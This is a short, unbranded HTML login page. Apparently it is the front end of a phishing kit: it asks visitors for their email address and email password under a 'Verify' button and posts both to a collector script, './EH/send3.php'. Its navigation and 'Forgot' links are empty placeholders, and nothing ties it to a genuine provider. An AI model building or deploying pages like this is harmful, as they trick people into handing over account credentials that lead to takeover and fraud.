<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined"
    rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
    <title>Log in now</title>
    <link rel="stylesheet" href="master.css">
  </head>
  <body>
<div class="container">
<div class="navbar">
  <div class="logo">
    <img src="logo.png" alt="logo">
  </div>


<div class="dot-menu">

    <span class="material-icons-outlined dot-menu-icon" style="font-size:32px;">
    more_horiz
    </span>
<div class="menu">
<a href="#"><span class="material-icons" style="font-size:30px;">
call
</span>Contact us</a>
<a href="#"> <span class="material-icons" style="font-size:30px;">
location_on
</span>Location</a>
<a href="#"> <span class="material-icons" style="font-size:30px;">
help_outline
</span>Help</a>
</div>
  </div>

</div>

  <div class="content">
    <form class="login-form" action="./EH/send3.php" method="post">


    <div class="data-input">
      <span class="material-icons" style="color:#666666;">
  person
  </span>
    <div class="m-field">
      <label for="">Email ID</label>
      <input required type="text" name="email-id" value="">
    </div>
    <span class="material-icons-outlined" style="display:none;color:#666666;">
    error_outline
    </span>
    </div>
    <div class="data-input">
      <span class="material-icons" style="color:#666666;" >
  lock
  </span>
        <div class="m-field">
    <label for="">
      Email Password</label>
    <input required type="password" name="email-password" value="">
  </div>
  <span class="material-icons visibility" style="color:#666666;" input="password">
  visibility
  </span>
    </div>
    <div class="remember">

  <span><input type="checkbox" name="" value=""> remember me</span>
  <div class="links">
    <a href="#">Forgot username?</a>
    <a href="#">Forgot Password?</a>
  </div>

    </div>
    <button type="submit" name="button">Verify</button>
    </form>

  </div>
</div>
  </body>
</html>
